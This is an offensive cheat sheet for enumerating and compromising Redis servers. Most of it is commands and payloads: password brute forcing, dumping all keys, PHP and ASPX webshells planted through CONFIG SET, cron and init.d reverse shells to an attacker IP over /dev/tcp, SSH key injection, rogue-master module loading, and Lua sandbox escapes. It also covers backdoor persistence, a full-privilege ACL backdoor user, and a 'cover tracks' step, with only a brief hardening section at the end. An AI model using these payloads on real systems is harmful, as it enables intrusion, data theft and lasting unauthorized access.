# REDIS ENUMERATION (Port 6379)

## PORT OVERVIEW
```
Port 6379 - Redis (default)
Port 6380 - Redis (alternative)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p6379 <IP>                            # Service/Version detection
nmap -p6379 --script redis-info <IP>            # Redis server info
nc -nv <IP> 6379                                # Manual connection
telnet <IP> 6379                                # Manual connection
```

## NMAP REDIS ENUMERATION
```bash
nmap --script "redis-*" -p6379 <IP>             # All Redis scripts
nmap --script redis-info -p6379 <IP>            # Server information
nmap --script redis-brute -p6379 <IP>           # Brute force
```

## REDIS-CLI (PRIMARY TOOL)
```bash
# Connect to Redis
redis-cli -h <IP>                               # Default port 6379
redis-cli -h <IP> -p 6379                       # Specify port
redis-cli -h <IP> -a <PASSWORD>                 # With password
redis-cli -h <IP> --user <USER> --pass <PASSWORD>  # Redis 6+ ACL

# After connection
<IP>:6379> INFO                                 # Server information
<IP>:6379> CONFIG GET *                         # Get all configuration
<IP>:6379> KEYS *                               # List all keys
<IP>:6379> GET <key>                            # Get key value
<IP>:6379> QUIT                                 # Exit
```

## AUTHENTICATION TESTING
```bash
# Test for no authentication
redis-cli -h <IP>                               # Try direct connection
<IP>:6379> INFO                                 # If no auth required, this works

# Test with password
redis-cli -h <IP>
<IP>:6379> AUTH <PASSWORD>                      # Authenticate
<IP>:6379> INFO                                 # Test if authenticated

# Common default passwords
redis
password
root
admin
P@ssw0rd
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -P passwords.txt redis://<IP>             # Password only (no username)
hydra -P /usr/share/wordlists/rockyou.txt redis://<IP>

# Nmap
nmap --script redis-brute -p6379 <IP>
nmap --script redis-brute --script-args passdb=passwords.txt -p6379 <IP>

# Patator
patator redis_login host=<IP> password=FILE0 0=passwords.txt -x ignore:fgrep='NOAUTH'
```

## ENUMERATE REDIS INFORMATION
```bash
# After authentication (or if no auth required)

# Server information
INFO                                            # Full server info
INFO server                                     # Server info only
INFO clients                                    # Connected clients
INFO memory                                     # Memory usage
INFO stats                                      # Statistics
INFO replication                                # Replication info
INFO cpu                                        # CPU usage
INFO keyspace                                   # Database keys stats

# Configuration
CONFIG GET *                                    # Get all configuration
CONFIG GET dir                                  # Get working directory
CONFIG GET dbfilename                           # Get database filename
CONFIG GET requirepass                          # Get password (if set)
CONFIG GET protected-mode                       # Check if protected mode is on
CONFIG GET bind                                 # Check bind address
```

## ENUMERATE KEYS & DATA
```bash
# List all keys
KEYS *                                          # List all keys (dangerous on large DBs!)
SCAN 0                                          # Iterate keys (safer)

# Get key information
TYPE <key>                                      # Get key type (string, list, set, hash, zset)
GET <key>                                       # Get value (for string keys)
HGETALL <key>                                   # Get all fields (for hash keys)
LRANGE <key> 0 -1                               # Get all elements (for list keys)
SMEMBERS <key>                                  # Get all members (for set keys)
ZRANGE <key> 0 -1 WITHSCORES                    # Get all members (for sorted set keys)

# Search for sensitive data
KEYS *password*                                 # Search for password keys
KEYS *user*                                     # Search for user keys
KEYS *token*                                    # Search for token keys
KEYS *session*                                  # Search for session keys
```

## EXTRACT ALL DATA
```bash
# Dump all keys and values
redis-cli -h <IP> --scan                        # Scan all keys
redis-cli -h <IP> --scan | while read key; do
  echo "KEY: $key"
  redis-cli -h <IP> GET "$key" 2>/dev/null || redis-cli -h <IP> HGETALL "$key" 2>/dev/null
done

# Backup database
redis-cli -h <IP> SAVE                          # Force save to disk
redis-cli -h <IP> BGSAVE                        # Background save
redis-cli -h <IP> CONFIG GET dir                # Get dump location
# Copy dump.rdb file from server

# Export to JSON
redis-cli -h <IP> --scan | while read key; do
  echo "{\"key\": \"$key\", \"value\": \"$(redis-cli -h <IP> GET "$key")\"}"
done > redis_dump.json
```

## COMMAND EXECUTION (WEBSHELL VIA CONFIG)
```bash
# If Redis can write to web directory
# Write PHP/JSP/ASPX webshell to web root

# Change Redis working directory to web root
CONFIG GET dir                                  # Check current directory
CONFIG SET dir /var/www/html                    # Set to web root
CONFIG SET dbfilename shell.php                 # Set filename

# Write webshell to Redis
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE                                            # Save to disk

# Access webshell
curl http://<IP>/shell.php?cmd=whoami

# Windows example
CONFIG SET dir C:\\inetpub\\wwwroot
CONFIG SET dbfilename shell.aspx
SET webshell "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><% Process.Start(\"cmd.exe\",\"/c \" + Request.QueryString[\"cmd\"]).WaitForExit(); %>"
SAVE
```

## COMMAND EXECUTION (CRON JOB)
```bash
# Write malicious cron job (Linux)

# Set Redis to write to cron directory
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root                      # root user's crontab

# Write cron job
SET cron "\n\n*/1 * * * * bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1\n\n"
SAVE

# Cron will execute reverse shell every minute

# Alternative: Write to /etc/cron.d/
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename backdoor
SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'\n\n"
SAVE
```

## COMMAND EXECUTION (SSH KEY)
```bash
# Write SSH public key to authorized_keys

# Generate SSH key pair (on attacker)
ssh-keygen -t rsa -f redis_key                  # Generate key

# Set Redis to write to SSH directory
CONFIG SET dir /root/.ssh/                      # For root user
CONFIG SET dbfilename authorized_keys

# Write SSH public key
SET sshkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali\n\n"
SAVE

# SSH to target
ssh -i redis_key root@<IP>

# Alternative: For specific user
CONFIG SET dir /home/user/.ssh/
CONFIG SET dbfilename authorized_keys
```

## COMMAND EXECUTION (MODULE LOAD)
```bash
# Redis 4.0+ allows loading modules (.so files)
# Load malicious module for RCE

# Compile malicious Redis module
# Example: RedisModulesSDK
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make

# Upload module to target
# Via web upload, SMB, or Redis itself (if writable directory)

# Load module
MODULE LOAD /path/to/module.so

# Execute command
system.exec "whoami"
system.exec "bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'"

# List loaded modules
MODULE LIST

# Unload module (cleanup)
MODULE UNLOAD system
```

## COMMAND EXECUTION (SLAVEOF + MODULE)
```bash
# Use Redis replication to load module
# Attacker sets up rogue Redis master with module loaded

# On attacker machine: Setup rogue Redis master
# Load malicious module on attacker's Redis

# On target: Set target as slave of attacker
SLAVEOF <attacker_IP> 6379                      # Target replicates from attacker
FULLRESYNC                                      # Force full resync

# Module is replicated to target
# Execute commands via module

# Cleanup
SLAVEOF NO ONE                                  # Stop replication
```

## LUA SANDBOX ESCAPE
```bash
# Redis allows Lua scripting
# Some versions have Lua sandbox escapes

# Execute Lua script
EVAL "return redis.call('GET', 'key')" 0

# Lua sandbox escape (CVE-2015-4335)
# Older Redis versions (< 3.0.2)
EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('whoami', 'r'); local res = f:read('*a'); f:close(); return res" 0

# Modern sandbox escape attempts
EVAL "dofile('/etc/passwd')" 0
```

## REDIS REPLICATION (MASTER-SLAVE)
```bash
# Enumerate replication information
INFO replication                                # Check if master or slave

# If master, enumerate slaves
INFO replication                                # Lists connected slaves

# If slave, get master info
INFO replication                                # Shows master IP/port

# Exploit replication for lateral movement
# Set target as slave of attacker's Redis
SLAVEOF <attacker_IP> 6379
# All data from attacker's Redis is replicated to target
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/redis/redis_server        # Redis server info
use auxiliary/scanner/redis/file_upload         # Upload file via Redis
use exploit/linux/redis/redis_replication_cmd_exec  # RCE via replication

# Example: RCE via replication
set RHOSTS <IP>
set LHOST <attacker_IP>
run
```

## REDIS ENUMERATION SCRIPT
```bash
# Automated Redis enumeration script
cat > redis_enum.sh <<'EOF'
#!/bin/bash
IP=$1
echo "[*] Redis Enumeration: $IP"
echo "[*] Testing for no authentication..."
redis-cli -h $IP INFO server 2>/dev/null && echo "[+] No authentication required!"
echo "[*] Dumping configuration..."
redis-cli -h $IP CONFIG GET \* 2>/dev/null
echo "[*] Listing all keys..."
redis-cli -h $IP KEYS \* 2>/dev/null
echo "[*] Checking replication..."
redis-cli -h $IP INFO replication 2>/dev/null
EOF
chmod +x redis_enum.sh
./redis_enum.sh <IP>
```

## REDIS PERSISTENCE
```bash
# After gaining access, create persistence

# Method 1: Cron job (already covered above)

# Method 2: SSH key (already covered above)

# Method 3: Startup script
CONFIG SET dir /etc/init.d/
CONFIG SET dbfilename backdoor
SET startup "#!/bin/bash\nbash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
SAVE
# Make executable via another vulnerability

# Method 4: Redis module with backdoor
# Load persistent module that runs on Redis startup
```

## DUMP REDIS DATABASE
```bash
# Download Redis database file (dump.rdb)

# Get database location
CONFIG GET dir                                  # e.g., /var/lib/redis
CONFIG GET dbfilename                           # e.g., dump.rdb

# Force save
SAVE                                            # Synchronous save
BGSAVE                                          # Background save

# Download file via SMB, HTTP, etc.
# Or read via another vulnerability (LFI, etc.)

# Parse dump.rdb locally
# Use tools like redis-rdb-tools
pip install rdbtools
rdb --command json dump.rdb > dump.json
```

## REDIS ACL (REDIS 6+)
```bash
# Redis 6+ supports Access Control Lists

# List users
ACL LIST                                        # List all users

# Get current user
ACL WHOAMI                                      # Current user

# Add user (requires admin)
ACL SETUSER backdoor on >Password123! ~* +@all  # Create user with full permissions

# Check user permissions
ACL GETUSER <username>                          # Get user details
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication (requirepass not set)
☐ Redis exposed to internet (bind 0.0.0.0)
☐ Protected mode disabled
☐ Weak password
☐ Redis running as root
☐ Writable web directory accessible
☐ Writable SSH directory accessible
☐ Module loading enabled
☐ Old Redis version (known CVEs)
☐ No firewall rules
```

## QUICK WIN CHECKLIST
```
☐ Test for no authentication
☐ Test default/weak passwords
☐ Enumerate server info (version, OS)
☐ List all keys (search for sensitive data)
☐ Check if Redis can write to web directory
☐ Check if Redis can write to SSH directory
☐ Check if Redis can write to cron directory
☐ Check if module loading is enabled
☐ Check if running as root
☐ Enumerate replication (master/slave)
☐ Dump all keys and values
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick Redis enumeration
nmap -sV -p6379 --script redis-info <IP>

# With redis-cli
redis-cli -h <IP> INFO
redis-cli -h <IP> CONFIG GET \*
redis-cli -h <IP> KEYS \*

# Automated
./redis_enum.sh <IP>
```

## ADVANCED TECHNIQUES
```bash
# Redis SSRF exploitation
# If web app connects to Redis based on user input
# Can exploit to access internal Redis instances

# Redis pub/sub for lateral movement
# Subscribe to channels for information gathering
SUBSCRIBE *
PSUBSCRIBE *

# Redis Lua scripting for advanced attacks
# Bypass restrictions via Lua

# Redis cluster enumeration
CLUSTER INFO                                    # Cluster information
CLUSTER NODES                                   # List cluster nodes
# Enumerate each node in cluster
```

## REDIS CVE EXPLOITS
```bash
# CVE-2015-4335 - Lua sandbox escape (Redis < 3.0.2)
# CVE-2015-8080 - Integer overflow (Redis < 3.0.5)
# CVE-2018-11218 - Integer overflow (Redis < 4.0.10, < 5.0 RC2)
# CVE-2018-11219 - Integer overflow (Redis < 4.0.10, < 5.0 RC2)
# CVE-2022-0543 - Lua sandbox escape (Debian-specific)

# Search for exploits
searchsploit redis
```

## POST-EXPLOITATION (AFTER REDIS ACCESS)
```bash
# After gaining Redis access:
1. Enumerate server information (version, OS, paths)
2. List all keys and extract sensitive data
3. Search for credentials, tokens, sessions
4. Check if Redis can write to web/SSH/cron directories
5. Attempt webshell via CONFIG SET
6. Attempt SSH key injection
7. Attempt cron job injection
8. Check if module loading is enabled (RCE)
9. Enumerate replication (lateral movement)
10. Dump entire database
11. Create persistence
12. Cover tracks (delete logs if possible)

# Full data extraction
redis-cli -h <IP> --scan | while read key; do
  type=$(redis-cli -h <IP> TYPE "$key" | tr -d '\r')
  echo "=== KEY: $key (TYPE: $type) ==="
  case $type in
    string) redis-cli -h <IP> GET "$key" ;;
    hash) redis-cli -h <IP> HGETALL "$key" ;;
    list) redis-cli -h <IP> LRANGE "$key" 0 -1 ;;
    set) redis-cli -h <IP> SMEMBERS "$key" ;;
    zset) redis-cli -h <IP> ZRANGE "$key" 0 -1 WITHSCORES ;;
  esac
done > redis_full_dump.txt
```

## REDIS SECURITY HARDENING (FOR BLUE TEAM)
```bash
# Secure Redis configuration

# Enable authentication
CONFIG SET requirepass <strong_password>

# Bind to localhost only
CONFIG SET bind 127.0.0.1

# Enable protected mode
CONFIG SET protected-mode yes

# Disable dangerous commands
CONFIG SET rename-command FLUSHDB ""
CONFIG SET rename-command FLUSHALL ""
CONFIG SET rename-command CONFIG ""
CONFIG SET rename-command SHUTDOWN ""
CONFIG SET rename-command SAVE ""
CONFIG SET rename-command BGSAVE ""
CONFIG SET rename-command DEBUG ""
CONFIG SET rename-command MODULE ""

# Firewall rules
# Allow only trusted IPs
```
